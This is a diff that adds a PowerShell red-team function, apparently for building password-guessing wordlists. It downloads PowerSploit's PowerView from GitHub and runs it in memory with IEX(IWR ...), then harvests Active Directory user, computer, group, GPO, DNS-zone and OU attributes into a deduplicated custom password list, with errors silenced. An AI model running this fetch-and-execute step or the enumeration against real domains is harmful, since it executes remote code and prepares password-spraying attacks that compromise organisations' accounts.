@@ -1,0 +1,104 @@
+Function Invoke-DomainDictionary{
+
+param (
+    [string]$Console = "N",
+    [string]$Domain = $env:USERDNSDOMAIN
+)
+
+IEX(IWR -UseBasicParsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
+
+
+
+$Path = "$HOME"
+$File = "CustomPasswordList.txt"
+$Final = "CustomPasswordListFinal.txt"
+$ErrorActionPreference = "Silentlycontinue"
+
+
+New-Item -Name $File -Path $Path -ItemType "File" -Force | Out-Null
+Add-Content -Path $Path\$File -Value $null
+
+Function DomainUserProperties{
+Get-DomainUser -Properties name -Domain $Domain | Select -ExpandProperty name | Add-Content -Path $Path\$File
+Get-DomainUser -Properties cn -Domain $Domain | Select -ExpandProperty cn | Add-Content -Path $Path\$File
+Get-DomainUser -Properties description -Domain $Domain | Select -ExpandProperty description | Add-Content -Path $Path\$File
+Get-DomainUser -Properties givenname -Domain $Domain | Select -ExpandProperty givenname | Add-Content -Path $Path\$File
+Get-DomainUser -Properties mail -Domain $Domain | Select -ExpandProperty mail | Add-Content -Path $Path\$File
+Get-DomainUser -Properties samaccountname -Domain $Domain | Select -ExpandProperty samaccountname | Add-Content -Path $Path\$File
+Get-DomainUser -Properties userprincipalname -Domain $Domain | Select -ExpandProperty userprincipalname | Add-Content -Path $Path\$File
+
+}
+
+Function DomainComputerProperties{
+Get-DomainComputer -Properties name -Domain $Domain | Select -ExpandProperty name |Add-Content -Path $Path\$File
+Get-DomainComputer -Properties cn -Domain $Domain | Select -ExpandProperty cn | Add-Content -Path $Path\$File
+Get-DomainComputer -Properties description -Domain $Domain | Select -ExpandProperty description  | Add-Content -Path $Path\$File
+Get-DomainComputer -Properties samaccountname -Domain $Domain | Select -ExpandProperty samaccountname | Add-Content -Path $Path\$File
+Get-DomainComputer -Properties dnshostname -Domain $Domain | Select -ExpandProperty dnshostname | Add-Content -Path $Path\$File
+Get-DomainComputer -Properties operatingsystem -Domain $Domain | Select -ExpandProperty operatingsystem |  Add-Content -Path $Path\$File
+
+}
+
+Function DomainControllerProperties{
+Get-DomainController -Domain $Domain | Select -ExpandProperty OSVersion | Add-Content -Path $Path\$File
+Get-DomainController -Domain $Domain | Select -ExpandProperty Forest | Add-Content -Path $Path\$File
+Get-DomainController -Domain $Domain | Select -ExpandProperty Name | Add-Content -Path $Path\$File
+Get-DomainController -Domain $Domain | Select -ExpandProperty IPAddress | Add-Content -Path $Path\$File
+
+}
+
+Function DomainZoneProperties{
+Get-DomainDNSZone -Domain $Domain | Select -ExpandProperty ZoneName | Add-Content -Path $Path\$File
+Get-DomainDNSZone -Domain $Domain| Select -ExpandProperty name | Add-Content -Path $Path\$File
+
+}
+
+
+Function DomainGPOProperties{
+Get-DomainGPO -Properties displayname -Domain $Domain | Select -ExpandProperty displayname |Add-Content -Path $Path\$File
+
+}
+
+
+Function DomainGroupProperties{
+Get-DomainGroup -Properties cn -Domain $Domain | Select -ExpandProperty cn |Add-Content -Path $Path\$File
+Get-DomainGroup -Properties samaccountname -Domain $Domain | Select -ExpandProperty samaccountname |Add-Content -Path $Path\$File
+Get-DomainGroup -Properties description -Domain $Domain | Select -ExpandProperty description |Add-Content -Path $Path\$File
+Get-DomainGroup -Properties name -Domain $Domain | Select -ExpandProperty name |Add-Content -Path $Path\$File
+
+}
+
+
+Function DomainOUProperties {
+Get-DomainOU -Properties ou -Domain $Domain  | Select -ExpandProperty ou |Add-Content -Path $Path\$File
+Get-DomainOU -Properties name -Domain $Domain  | Select -ExpandProperty name |Add-Content -Path $Path\$File
+
+}
+
+# Execute each function
+
+
+DomainOUProperties
+DomainGroupProperties
+DomainGPOProperties
+DomainZoneProperties
+DomainControllerProperties
+DomainComputerProperties
+DomainUserProperties
+
+Get-Content -Path $Path\$File | Sort | Get-Unique > $Path\$Final
+$OriginalFileCount = (Get-Content -Path $Path\$File).count
+$FinalFileLines = (Get-Content -Path $Path\$Final).count
+Write-Host ""
+Write-Host ""
+Write-Host ""
+Write-Host "[INFO] Original File Has [$OriginalFileCount] Lines"
+Write-Host "[INFO] Removing Duplicate entries"
+Write-Host "[INFO] Final file has [$FinalFileLines] Lines"
+Write-Host "[INFO] Final file located at $Path\$Final"
+Start-Sleep -Milliseconds 1337
+If ($Console -eq "Y"){Get-Content -Path $Path\$Final}
+Write-Host ""
+Write-Host "[INFO] Script Execution Complete" -ForegroundColor "Green"
+
+}
